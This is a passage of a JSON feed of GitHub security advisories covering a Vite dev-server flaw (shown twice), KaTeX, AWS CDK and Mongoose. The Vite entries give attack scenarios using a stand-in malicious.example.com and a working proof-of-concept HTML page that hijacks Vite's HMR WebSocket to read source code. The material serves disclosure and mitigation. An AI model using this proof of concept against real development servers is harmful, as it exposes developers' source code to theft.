<code>*.localhost</code></h4>\n<p>You need to add the hostname to the new <a href=\"https://vite.dev/config/server-options.html#server-allowedhosts\"><code>server.allowedHosts</code></a> option. For example, if you are accessing the development server via <code>http://foo.example.com:8080</code>, you need to add <code>foo.example.com</code> to the <code>server.allowedHosts</code> option.</p>\n<h4 id=\"using-a-plugin--framework-that-connects-to-the-websocket-server-on-their-own-from-the-browser\">Using a plugin / framework that connects to the WebSocket server on their own from the browser</h4>\n<p>If you are using a plugin / framework, try upgrading to a newer version of Vite that fixes the vulnerability. If the WebSocket connection appears not to be working, the plugin / framework may have a code that connects to the WebSocket server on their own from the browser.</p>\n<p>In that case, you can either:</p>\n<ul>\n<li>fix the plugin / framework code to the make it compatible with the new version of Vite</li>\n<li>set <code>legacy.skipWebSocketTokenCheck: true</code> to opt-out the fix for [2] while the plugin / framework is incompatible with the new version of Vite<ul>\n<li>When enabling this option, <strong>make sure that you are aware of the security implications</strong> described in the impact section of [2] above.</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"mitigation-without-upgrading-vite\">Mitigation without upgrading Vite</h3>\n<h4 id=\"1-permissive-default-cors-settings\">[1]: Permissive default CORS settings</h4>\n<p>Set <code>server.cors</code> to <code>false</code> or limit <code>server.cors.origin</code> to trusted origins.</p>\n<h4 id=\"2-lack-of-validation-on-the-origin-header-for-websocket-connections\">[2]: Lack of validation on the Origin header for WebSocket connections</h4>\n<p>There aren't any mitigations for this.</p>\n<h4 id=\"3-lack-of-validation-on-the-host-header-for-http-requests\">[3]: Lack of validation on the Host header for HTTP requests</h4>\n<p>Use Chrome 94+ or use HTTPS for the development server.</p>\n<h3 id=\"details\">Details</h3>\n<p>There are three causes that allowed malicious websites to send any requests to the development server:</p>\n<h4 id=\"1-permissive-default-cors-settings-1\">[1]: Permissive default CORS settings</h4>\n<p>Vite sets the <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin\"><code>Access-Control-Allow-Origin</code></a> header depending on <a href=\"https://vite.dev/config/server-options.html#server-cors\"><code>server.cors</code></a> option. The default value was <code>true</code> which sets <code>Access-Control-Allow-Origin: *</code>. This allows websites on any origin to <code>fetch</code> contents served on the development server.</p>\n<p>Attack scenario:</p>\n<ol>\n<li>The attacker serves a malicious web page (<code>http://malicious.example.com</code>).</li>\n<li>The user accesses the malicious web page.</li>\n<li>The attacker sends a <code>fetch('http://127.0.0.1:5173/main.js')</code> request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above.</li>\n<li>The attacker gets the content of <code>http://127.0.0.1:5173/main.js</code>.</li>\n</ol>\n<h4 id=\"2-lack-of-validation-on-the-origin-header-for-websocket-connections-1\">[2]: Lack of validation on the Origin header for WebSocket connections</h4>\n<p>Vite starts a WebSocket server to handle HMR and other functionalities. This WebSocket server <a href=\"https://github.com/vitejs/vite/blob/v6.0.7/packages/vite/src/node/server/ws.ts#L145-L157\">did not perform validation on the Origin header</a> and was vulnerable to Cross-Site WebSocket Hijacking (CSWSH) attacks. With that attack, an attacker can read and write messages on the WebSocket connection. Vite only sends some information over the WebSocket connection (<a href=\"https://github.com/vitejs/vite/blob/v6.0.7/packages/vite/types/hmrPayload.d.ts#L12-L72\">list of the file paths that changed, the file content where the errored happened, etc.</a>), but plugins can send arbitrary messages and may include more sensitive information.</p>\n<p>Attack scenario:</p>\n<ol>\n<li>The attacker serves a malicious web page (<code>http://malicious.example.com</code>).</li>\n<li>The user accesses the malicious web page.</li>\n<li>The attacker runs <code>new WebSocket('http://127.0.0.1:5173', 'vite-hmr')</code> by JS in that malicious web page.</li>\n<li>The user edits some files.</li>\n<li>Vite sends some HMR messages over WebSocket.</li>\n<li>The attacker gets the content of the HMR messages.</li>\n</ol>\n<h4 id=\"3-lack-of-validation-on-the-host-header-for-http-requests-1\">[3]: Lack of validation on the Host header for HTTP requests</h4>\n<p>Unless <a href=\"https://vite.dev/config/server-options.html#server-https\"><code>server.https</code></a> is set, Vite starts the development server on HTTP. Non-HTTPS servers are vulnerable to DNS rebinding attacks without validation on the Host header. But Vite did not perform validation on the Host header. By exploiting this vulnerability, an attacker can send arbitrary requests to the development server bypassing the same-origin policy.</p>\n<ol>\n<li>The attacker serves a malicious web page that is served on <strong>HTTP</strong> (<code>http://malicious.example.com:5173</code>) (HTTPS won't work).</li>\n<li>The user accesses the malicious web page.</li>\n<li>The attacker changes the DNS to point to 127.0.0.1 (or other private addresses).</li>\n<li>The attacker sends a <code>fetch('/main.js')</code> request by JS in that malicious web page.</li>\n<li>The attacker gets the content of <code>http://127.0.0.1:5173/main.js</code> bypassing the same origin policy.</li>\n</ol>\n<h3 id=\"impact\">Impact</h3>\n<h4 id=\"1-permissive-default-cors-settings-2\">[1]: Permissive default CORS settings</h4>\n<p>Users with the default <code>server.cors</code> option may:</p>\n<ul>\n<li>get the source code stolen by malicious websites</li>\n<li>give the attacker access to functionalities that are not supposed to be exposed externally<ul>\n<li>Vite core does not have any functionality that causes changes somewhere else when receiving a request, but plugins may implement those functionalities and servers behind <code>server.proxy</code> may have those functionalities.</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"2-lack-of-validation-on-the-origin-header-for-websocket-connections-2\">[2]: Lack of validation on the Origin header for WebSocket connections</h4>\n<p>All users may get the file paths of the files that changed and the file content where the error happened be stolen by malicious websites.</p>\n<p>For users that is using a plugin that sends messages over WebSocket, that content may be stolen by malicious websites.</p>\n<p>For users that is using a plugin that has a functionality that is triggered by messages over WebSocket, that functionality may be exploited by malicious websites.</p>\n<h4 id=\"3-lack-of-validation-on-the-host-header-for-http-requests-2\">[3]: Lack of validation on the Host header for HTTP requests</h4>\n<p>Users using HTTP for the development server and using a browser that is not Chrome 94+ may:</p>\n<ul>\n<li>get the source code stolen by malicious websites</li>\n<li>give the attacker access to functionalities that are not supposed to be exposed externally<ul>\n<li>Vite core does not have any functionality that causes changes somewhere else when receiving a request, but plugins may implement those functionalities and servers behind <code>server.proxy</code> may have those functionalities.</li>\n</ul>\n</li>\n</ul>\n<p>Chrome 94+ users are not affected for [3], because <a href=\"https://developer.chrome.com/blog/private-network-access-update#chrome_94\">sending a request to a private network page from public non-HTTPS page is forbidden</a> since Chrome 94.</p>\n<h3 id=\"related-information\">Related Information</h3>\n<p>Safari has <a href=\"https://bugs.webkit.org/show_bug.cgi?id=171934\">a bug that blocks requests to loopback addresses from HTTPS origins</a>. This means when the user is using Safari and Vite is listening on lookback addresses, there's another condition of \"the malicious web page is served on HTTP\" to make [1] and [2] to work.</p>\n<h3 id=\"poc\">PoC</h3>\n<h4 id=\"2-lack-of-validation-on-the-origin-header-for-websocket-connections-3\">[2]: Lack of validation on the Origin header for WebSocket connections</h4>\n<ol>\n<li>I used the <code>react</code> template which utilizes HMR functionality.</li>\n</ol>\n<pre><code>npm create vite@latest my-vue-app-react -- --template react\n</code></pre>\n<ol start=\"2\">\n<li>Then on a malicious server, serve the following POC html:</li>\n</ol>\n<pre><code class=\"language-html\">&lt;!doctype html&gt;\n&lt;html lang=\"en\"&gt;\n    &lt;head&gt;\n        &lt;meta charset=\"utf-8\" /&gt;\n        &lt;title&gt;vite CSWSH&lt;/title&gt;\n    &lt;/head&gt;\n    &lt;body&gt;\n        &lt;div id=\"logs\"&gt;&lt;/div&gt;\n        &lt;script&gt;\n            const div = document.querySelectorAll('#logs')[0];\n            const ws = new WebSocket('ws://localhost:5173','vite-hmr');\n            ws.onmessage = event =&gt; {\n                const logLine = document.createElement('p');\n                logLine.innerHTML = event.data;\n                div.append(logLine);\n            };\n        &lt;/script&gt;\n    &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n<ol start=\"3\">\n<li>Kick off Vite</li>\n</ol>\n<pre><code>npm run dev\n</code></pre>\n<ol start=\"4\">\n<li>Load the development server (open <code>http://localhost:5173/</code>) as well as the malicious page in the browser. </li>\n<li>Edit <code>src/App.jsx</code> file and intentionally place a syntax error</li>\n<li>Notice how the malicious page can view the websocket messages and a snippet of the source code is exposed</li>\n</ol>\n<p>Here's a video demonstrating the POC:</p>\n<p><a href=\"https://github.com/user-attachments/assets/a4ad05cd-0b34-461c-9ff6-d7c8663d6961\">https://github.com/user-attachments/assets/a4ad05cd-0b34-461c-9ff6-d7c8663d6961</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vitejs/vite/security/advisories/GHSA-vg6x-rcgg-rjx6\">https://github.com/vitejs/vite/security/advisories/GHSA-vg6x-rcgg-rjx6</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-24010\">https://nvd.nist.gov/vuln/detail/CVE-2025-24010</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vg6x-rcgg-rjx6\">https://github.com/advisories/GHSA-vg6x-rcgg-rjx6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vg6x-rcgg-rjx6",
            "title": "[vite] Websites were able to send any requests to the development server and read the response in vite",
            "date_modified": "2025-01-21T19:52:56.000Z",
            "date_published": "2025-01-21T19:52:55.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vg6x-rcgg-rjx6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Vite allowed any websites to send any requests to the development server and read the response due to default CORS settings and lack of validation on the Origin header for WebSocket connections.</p>\n<h3 id=\"upgrade-path\">Upgrade Path</h3>\n<p>Users that does not match either of the following conditions should be able to upgrade to a newer version of Vite that fixes the vulnerability without any additional configuration.</p>\n<ul>\n<li>Using the backend integration feature</li>\n<li>Using a reverse proxy in front of Vite</li>\n<li>Accessing the development server via a domain other than <code>localhost</code> or <code>*.localhost</code></li>\n<li>Using a plugin / framework that connects to the WebSocket server on their own from the browser</li>\n</ul>\n<h4 id=\"using-the-backend-integration-feature\">Using the backend integration feature</h4>\n<p>If you are using the backend integration feature and not setting <a href=\"https://vite.dev/config/server-options.html#server-origin\"><code>server.origin</code></a>, you need to add the origin of the backend server to the <a href=\"https://github.com/expressjs/cors#configuration-options\"><code>server.cors.origin</code></a> option. Make sure to set a specific origin rather than <code>*</code>, otherwise any origin can access your development server.</p>\n<h4 id=\"using-a-reverse-proxy-in-front-of-vite\">Using a reverse proxy in front of Vite</h4>\n<p>If you are using a reverse proxy in front of Vite and sending requests to Vite with a hostname other than <code>localhost</code> or <code>*.localhost</code>, you need to add the hostname to the new <a href=\"https://vite.dev/config/server-options.html#server-allowedhosts\"><code>server.allowedHosts</code></a> option. For example, if the reverse proxy is sending requests to <code>http://vite:5173</code>, you need to add <code>vite</code> to the <code>server.allowedHosts</code> option.</p>\n<h4 id=\"accessing-the-development-server-via-a-domain-other-than-localhost-or-localhost\">Accessing the development server via a domain other than <code>localhost</code> or <code>*.localhost</code></h4>\n<p>You need to add the hostname to the new <a href=\"https://vite.dev/config/server-options.html#server-allowedhosts\"><code>server.allowedHosts</code></a> option. For example, if you are accessing the development server via <code>http://foo.example.com:8080</code>, you need to add <code>foo.example.com</code> to the <code>server.allowedHosts</code> option.</p>\n<h4 id=\"using-a-plugin--framework-that-connects-to-the-websocket-server-on-their-own-from-the-browser\">Using a plugin / framework that connects to the WebSocket server on their own from the browser</h4>\n<p>If you are using a plugin / framework, try upgrading to a newer version of Vite that fixes the vulnerability. If the WebSocket connection appears not to be working, the plugin / framework may have a code that connects to the WebSocket server on their own from the browser.</p>\n<p>In that case, you can either:</p>\n<ul>\n<li>fix the plugin / framework code to the make it compatible with the new version of Vite</li>\n<li>set <code>legacy.skipWebSocketTokenCheck: true</code> to opt-out the fix for [2] while the plugin / framework is incompatible with the new version of Vite<ul>\n<li>When enabling this option, <strong>make sure that you are aware of the security implications</strong> described in the impact section of [2] above.</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"mitigation-without-upgrading-vite\">Mitigation without upgrading Vite</h3>\n<h4 id=\"1-permissive-default-cors-settings\">[1]: Permissive default CORS settings</h4>\n<p>Set <code>server.cors</code> to <code>false</code> or limit <code>server.cors.origin</code> to trusted origins.</p>\n<h4 id=\"2-lack-of-validation-on-the-origin-header-for-websocket-connections\">[2]: Lack of validation on the Origin header for WebSocket connections</h4>\n<p>There aren't any mitigations for this.</p>\n<h4 id=\"3-lack-of-validation-on-the-host-header-for-http-requests\">[3]: Lack of validation on the Host header for HTTP requests</h4>\n<p>Use Chrome 94+ or use HTTPS for the development server.</p>\n<h3 id=\"details\">Details</h3>\n<p>There are three causes that allowed malicious websites to send any requests to the development server:</p>\n<h4 id=\"1-permissive-default-cors-settings-1\">[1]: Permissive default CORS settings</h4>\n<p>Vite sets the <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin\"><code>Access-Control-Allow-Origin</code></a> header depending on <a href=\"https://vite.dev/config/server-options.html#server-cors\"><code>server.cors</code></a> option. The default value was <code>true</code> which sets <code>Access-Control-Allow-Origin: *</code>. This allows websites on any origin to <code>fetch</code> contents served on the development server.</p>\n<p>Attack scenario:</p>\n<ol>\n<li>The attacker serves a malicious web page (<code>http://malicious.example.com</code>).</li>\n<li>The user accesses the malicious web page.</li>\n<li>The attacker sends a <code>fetch('http://127.0.0.1:5173/main.js')</code> request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above.</li>\n<li>The attacker gets the content of <code>http://127.0.0.1:5173/main.js</code>.</li>\n</ol>\n<h4 id=\"2-lack-of-validation-on-the-origin-header-for-websocket-connections-1\">[2]: Lack of validation on the Origin header for WebSocket connections</h4>\n<p>Vite starts a WebSocket server to handle HMR and other functionalities. This WebSocket server <a href=\"https://github.com/vitejs/vite/blob/v6.0.7/packages/vite/src/node/server/ws.ts#L145-L157\">did not perform validation on the Origin header</a> and was vulnerable to Cross-Site WebSocket Hijacking (CSWSH) attacks. With that attack, an attacker can read and write messages on the WebSocket connection. Vite only sends some information over the WebSocket connection (<a href=\"https://github.com/vitejs/vite/blob/v6.0.7/packages/vite/types/hmrPayload.d.ts#L12-L72\">list of the file paths that changed, the file content where the errored happened, etc.</a>), but plugins can send arbitrary messages and may include more sensitive information.</p>\n<p>Attack scenario:</p>\n<ol>\n<li>The attacker serves a malicious web page (<code>http://malicious.example.com</code>).</li>\n<li>The user accesses the malicious web page.</li>\n<li>The attacker runs <code>new WebSocket('http://127.0.0.1:5173', 'vite-hmr')</code> by JS in that malicious web page.</li>\n<li>The user edits some files.</li>\n<li>Vite sends some HMR messages over WebSocket.</li>\n<li>The attacker gets the content of the HMR messages.</li>\n</ol>\n<h4 id=\"3-lack-of-validation-on-the-host-header-for-http-requests-1\">[3]: Lack of validation on the Host header for HTTP requests</h4>\n<p>Unless <a href=\"https://vite.dev/config/server-options.html#server-https\"><code>server.https</code></a> is set, Vite starts the development server on HTTP. Non-HTTPS servers are vulnerable to DNS rebinding attacks without validation on the Host header. But Vite did not perform validation on the Host header. By exploiting this vulnerability, an attacker can send arbitrary requests to the development server bypassing the same-origin policy.</p>\n<ol>\n<li>The attacker serves a malicious web page that is served on <strong>HTTP</strong> (<code>http://malicious.example.com:5173</code>) (HTTPS won't work).</li>\n<li>The user accesses the malicious web page.</li>\n<li>The attacker changes the DNS to point to 127.0.0.1 (or other private addresses).</li>\n<li>The attacker sends a <code>fetch('/main.js')</code> request by JS in that malicious web page.</li>\n<li>The attacker gets the content of <code>http://127.0.0.1:5173/main.js</code> bypassing the same origin policy.</li>\n</ol>\n<h3 id=\"impact\">Impact</h3>\n<h4 id=\"1-permissive-default-cors-settings-2\">[1]: Permissive default CORS settings</h4>\n<p>Users with the default <code>server.cors</code> option may:</p>\n<ul>\n<li>get the source code stolen by malicious websites</li>\n<li>give the attacker access to functionalities that are not supposed to be exposed externally<ul>\n<li>Vite core does not have any functionality that causes changes somewhere else when receiving a request, but plugins may implement those functionalities and servers behind <code>server.proxy</code> may have those functionalities.</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"2-lack-of-validation-on-the-origin-header-for-websocket-connections-2\">[2]: Lack of validation on the Origin header for WebSocket connections</h4>\n<p>All users may get the file paths of the files that changed and the file content where the error happened be stolen by malicious websites.</p>\n<p>For users that is using a plugin that sends messages over WebSocket, that content may be stolen by malicious websites.</p>\n<p>For users that is using a plugin that has a functionality that is triggered by messages over WebSocket, that functionality may be exploited by malicious websites.</p>\n<h4 id=\"3-lack-of-validation-on-the-host-header-for-http-requests-2\">[3]: Lack of validation on the Host header for HTTP requests</h4>\n<p>Users using HTTP for the development server and using a browser that is not Chrome 94+ may:</p>\n<ul>\n<li>get the source code stolen by malicious websites</li>\n<li>give the attacker access to functionalities that are not supposed to be exposed externally<ul>\n<li>Vite core does not have any functionality that causes changes somewhere else when receiving a request, but plugins may implement those functionalities and servers behind <code>server.proxy</code> may have those functionalities.</li>\n</ul>\n</li>\n</ul>\n<p>Chrome 94+ users are not affected for [3], because <a href=\"https://developer.chrome.com/blog/private-network-access-update#chrome_94\">sending a request to a private network page from public non-HTTPS page is forbidden</a> since Chrome 94.</p>\n<h3 id=\"related-information\">Related Information</h3>\n<p>Safari has <a href=\"https://bugs.webkit.org/show_bug.cgi?id=171934\">a bug that blocks requests to loopback addresses from HTTPS origins</a>. This means when the user is using Safari and Vite is listening on lookback addresses, there's another condition of \"the malicious web page is served on HTTP\" to make [1] and [2] to work.</p>\n<h3 id=\"poc\">PoC</h3>\n<h4 id=\"2-lack-of-validation-on-the-origin-header-for-websocket-connections-3\">[2]: Lack of validation on the Origin header for WebSocket connections</h4>\n<ol>\n<li>I used the <code>react</code> template which utilizes HMR functionality.</li>\n</ol>\n<pre><code>npm create vite@latest my-vue-app-react -- --template react\n</code></pre>\n<ol start=\"2\">\n<li>Then on a malicious server, serve the following POC html:</li>\n</ol>\n<pre><code class=\"language-html\">&lt;!doctype html&gt;\n&lt;html lang=\"en\"&gt;\n    &lt;head&gt;\n        &lt;meta charset=\"utf-8\" /&gt;\n        &lt;title&gt;vite CSWSH&lt;/title&gt;\n    &lt;/head&gt;\n    &lt;body&gt;\n        &lt;div id=\"logs\"&gt;&lt;/div&gt;\n        &lt;script&gt;\n            const div = document.querySelectorAll('#logs')[0];\n            const ws = new WebSocket('ws://localhost:5173','vite-hmr');\n            ws.onmessage = event =&gt; {\n                const logLine = document.createElement('p');\n                logLine.innerHTML = event.data;\n                div.append(logLine);\n            };\n        &lt;/script&gt;\n    &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n<ol start=\"3\">\n<li>Kick off Vite</li>\n</ol>\n<pre><code>npm run dev\n</code></pre>\n<ol start=\"4\">\n<li>Load the development server (open <code>http://localhost:5173/</code>) as well as the malicious page in the browser. </li>\n<li>Edit <code>src/App.jsx</code> file and intentionally place a syntax error</li>\n<li>Notice how the malicious page can view the websocket messages and a snippet of the source code is exposed</li>\n</ol>\n<p>Here's a video demonstrating the POC:</p>\n<p><a href=\"https://github.com/user-attachments/assets/a4ad05cd-0b34-461c-9ff6-d7c8663d6961\">https://github.com/user-attachments/assets/a4ad05cd-0b34-461c-9ff6-d7c8663d6961</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vitejs/vite/security/advisories/GHSA-vg6x-rcgg-rjx6\">https://github.com/vitejs/vite/security/advisories/GHSA-vg6x-rcgg-rjx6</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-24010\">https://nvd.nist.gov/vuln/detail/CVE-2025-24010</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vg6x-rcgg-rjx6\">https://github.com/advisories/GHSA-vg6x-rcgg-rjx6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vg6x-rcgg-rjx6",
            "title": "[vite] Websites were able to send any requests to the development server and read the response in vite",
            "date_modified": "2025-01-21T19:52:56.000Z",
            "date_published": "2025-01-21T19:52:55.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vg6x-rcgg-rjx6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>KaTeX users who render untrusted mathematical expressions with <code>renderToString</code> could encounter malicious input using <code>\\htmlData</code> that runs arbitrary JavaScript, or generate invalid HTML.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Upgrade to KaTeX v0.16.21 to remove this vulnerability.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<ul>\n<li>Avoid use of or turn off the <code>trust</code> option, or set it to forbid <code>\\htmlData</code> commands.</li>\n<li>Forbid inputs containing the substring <code>\"\\\\htmlData\"</code>.</li>\n<li>Sanitize HTML output from KaTeX.</li>\n</ul>\n<h3 id=\"details\">Details</h3>\n<p><code>\\htmlData</code> did not validate its attribute name argument, allowing it to generate invalid or malicious HTML that runs scripts.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Open an issue or security advisory in the <a href=\"https://github.com/KaTeX/KaTeX/\">KaTeX repository</a></li>\n<li>Email us at <a href=\"mailto:katex-security@mit.edu\">katex-security@mit.edu</a></li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/KaTeX/KaTeX/security/advisories/GHSA-cg87-wmx4-v546\">https://github.com/KaTeX/KaTeX/security/advisories/GHSA-cg87-wmx4-v546</a></li>\n<li><a href=\"https://github.com/KaTeX/KaTeX/commit/ff289955e81aab89086eef09254cbf88573d415c\">https://github.com/KaTeX/KaTeX/commit/ff289955e81aab89086eef09254cbf88573d415c</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-23207\">https://nvd.nist.gov/vuln/detail/CVE-2025-23207</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cg87-wmx4-v546\">https://github.com/advisories/GHSA-cg87-wmx4-v546</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cg87-wmx4-v546",
            "title": "[katex] KaTeX \\htmlData does not validate attribute names",
            "date_modified": "2025-01-21T18:31:03.000Z",
            "date_published": "2025-01-17T21:22:56.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cg87-wmx4-v546"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Users who use IAM OIDC custom resource provider package will download CA Thumbprints as part of the custom resource workflow, <a href=\"https://github.com/aws/aws-cdk/blob/d16482fc8a4a3e1f62751f481b770c09034df7d2/packages/%40aws-cdk/custom-resource-handlers/lib/aws-iam/oidc-handler/external.ts#L34\">https://github.com/aws/aws-cdk/blob/d16482fc8a4a3e1f62751f481b770c09034df7d2/packages/%40aws-cdk/custom-resource-handlers/lib/aws-iam/oidc-handler/external.ts#L34</a>. </p>\n<p>However, the current <code>tls.connect</code> method will always set <code>rejectUnauthorized: false</code> which is a potential security concern. CDK should follow the best practice and set <code>rejectUnauthorized: true</code>. However, this could be a breaking change for existing CDK applications and we should fix this with a feature flag. </p>\n<p>Note that this is marked as low severity Security advisory because the issuer url is provided by CDK users who define the CDK application. If they insist on connecting to a unauthorized OIDC provider, CDK should not disallow this. Additionally, the code block is run in a Lambda environment which mitigate the MITM attack.</p>\n<p>As a best practice, CDK should still fix this issue under a feature flag to avoid regression.</p>\n<pre><code>packages/@aws-cdk/custom-resource-handlers/lib/aws-iam/oidc-handler/external.ts\n❯❱ problem-based-packs.insecure-transport.js-node.bypass-tls-verification.bypass-tls-verification\nChecks for setting the environment variable NODE_TLS_REJECT_UNAUTHORIZED to 0, which disables TLS\nverification. This should only be used for debugging purposes. Setting the option rejectUnauthorized\nto false bypasses verification against the list of trusted CAs, which also leads to insecure\ntransport.\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<p>The patch is in progress. To mitigate, upgrade to CDK v2.177.0 (Expected release date 2025-02-22). \nOnce upgraded, please make sure the feature flag '@aws-cdk/aws-iam:oidcRejectUnauthorizedConnections' is set to true in <code>cdk.context.json</code> or <code>cdk.json</code>. More details on feature flag setting is <a href=\"https://docs.aws.amazon.com/cdk/v2/guide/featureflags.html\">here</a>.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>N/A</p>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://github.com/aws/aws-cdk/issues/32920\">https://github.com/aws/aws-cdk/issues/32920</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/aws/aws-cdk/security/advisories/GHSA-v4mq-x674-ff73\">https://github.com/aws/aws-cdk/security/advisories/GHSA-v4mq-x674-ff73</a></li>\n<li><a href=\"https://github.com/aws/aws-cdk/issues/32920\">https://github.com/aws/aws-cdk/issues/32920</a></li>\n<li><a href=\"https://github.com/aws/aws-cdk/commit/3e4f3773bfa48b75bf0adc7d53d46bbec7714a9e#diff-38a03353f201fd2e520df67fb43f9f000257bffd6e9acaa5569cce7005a77560\">https://github.com/aws/aws-cdk/commit/3e4f3773bfa48b75bf0adc7d53d46bbec7714a9e#diff-38a03353f201fd2e520df67fb43f9f000257bffd6e9acaa5569cce7005a77560</a></li>\n<li><a href=\"https://docs.aws.amazon.com/cdk/v2/guide/featureflags.html\">https://docs.aws.amazon.com/cdk/v2/guide/featureflags.html</a></li>\n<li><a href=\"https://github.com/aws/aws-cdk/blob/d16482fc8a4a3e1f62751f481b770c09034df7d2/packages/%40aws-cdk/custom-resource-handlers/lib/aws-iam/oidc-handler/external.ts#L34\">https://github.com/aws/aws-cdk/blob/d16482fc8a4a3e1f62751f481b770c09034df7d2/packages/%40aws-cdk/custom-resource-handlers/lib/aws-iam/oidc-handler/external.ts#L34</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-23206\">https://nvd.nist.gov/vuln/detail/CVE-2025-23206</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-v4mq-x674-ff73\">https://github.com/advisories/GHSA-v4mq-x674-ff73</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-v4mq-x674-ff73",
            "title": "[aws-cdk-lib] AWS Cloud Development Kit (AWS CDK) IAM OIDC custom resource allows connection to unauthorized OIDC provider",
            "date_modified": "2025-01-17T21:57:05.000Z",
            "date_published": "2025-01-17T21:22:25.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-v4mq-x674-ff73"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Mongoose versions prior to 8.9.5, 7.8.4, and 6.13.6 are vulnerable to improper use of the <code>$where</code> operator. This vulnerability arises from the ability of the <code>$where</code> clause to execute arbitrary JavaScript code in MongoDB queries, potentially leading to code injection attacks and unauthorized access or manipulation of database data.</p>\n<p>NOTE: this issue exists because of an incomplete fix for CVE-2024-53900.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-23061\">https://nvd.nist.gov/vuln/detail/CVE-2025-23061</a></li>\n<li><a href=\"https://github.com/Automattic/mongoose/commit/64a9f9706f2428c49e0cfb8e223065acc645f7bc\">https://github.com/Automattic/mongoose/commit/64a9f9706f2428c49e0cfb8e223065acc645f7bc</a></li>\n<li><a href=\"https://github.com/Automattic/mongoose/blob/master/CHANGELOG.md\">https://github.com/Automattic/mongoose/blob/master/CHANGELOG.md</a></li>\n<li><a href=\"https://github.com/Automattic/mongoose/releases/tag/8.9.5\">https://github.com/Automattic/mongoose/releases/tag/8.9.5</a></li>\n<li><a href=\"https://www.npmjs.com/package/mongoose?activeTab=versions\">https://www.npmjs.com/package/mongoose?activeTab=versions</a></li>\n<li><a href=\"https://github.com/Automattic/mongoose/compare/6.13.5...6.13.6\">https://github.com/Automattic/mongoose/compare/6.13.5...6.13.6</a></li>\n<li><a href=\"https://github.com/Automattic/mongoose/compare/7.8.3...7.8.4\">https://github.com/Automattic/mongoose/compare/7.8.3...7.8.4</a></li>\n<li><a href=\"https://github.com/Automattic/mongoose/compare/8.9.4...8.9.5\">https://github.com/Automattic/mongoose/compare/8.9.4...8.9.5</a></li>\n<li><a href=\"https://github.com/Automattic/mongoose/releases/tag/6.13.6\">https://github.com/Automattic/mongoose/releases/tag/6.13.6</a></li>\n<li><a href=\"https://github.com/Automattic/mongoose/releases/tag/7.8.4\">https://github.com/Automattic/mongoose/releases/tag/7.8.4</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-m7xq-9374-9rvx\">https://github.com/advisories/GHSA-m7xq-9374-9rvx</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vg7j-7cwx-8wgw\">https://github.com/advisories/GHSA-vg7j-7cwx-8wgw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vg7j-7cwx-8wgw",
            "title": "[mongoose] Mongoose search injection vulnerability",
            "date_modified": "2025-01-17T18:02:41.000Z",
            "date_published": "2025-01-15T06:30:49.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vg7j-7cwx-8wgw"
            },
            "tags": [
                "severity"
            ]
        },
        {
